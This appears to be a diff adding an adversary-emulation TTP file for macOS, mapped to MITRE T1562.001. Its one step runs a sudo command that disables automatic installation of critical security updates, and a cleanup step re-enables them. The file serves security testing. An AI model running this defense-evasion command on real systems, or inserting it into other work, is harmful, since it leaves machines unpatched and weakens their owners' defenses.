@@ -1,0 +1,31 @@
+---
+api_version: 2.0
+uuid: fb5741e9-301f-438c-8c89-099d8e6fd8ea
+name: Disable system security updates
+authors:
+  - VVX7
+  - I50
+description: |
+  This TTP disables the automatic installation of macOS security updates.
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1562 Impair Defenses"
+  subtechniques:
+    - "T1562.001 Impair Defenses: Disable or Modify Tools"
+steps:
+  - name: disable-updates
+    inline: |
+      echo -e "===> Disabling automatic installation of security updates..."
+      sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist CriticalUpdateInstall -bool NO
+      echo "[+] DONE!"
+
+    cleanup:
+      inline: |
+        echo -e "===> Enabling automatic installation of security updates..."
+        sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate.plist CriticalUpdateInstall -bool YES
+        echo "[+] DONE!"
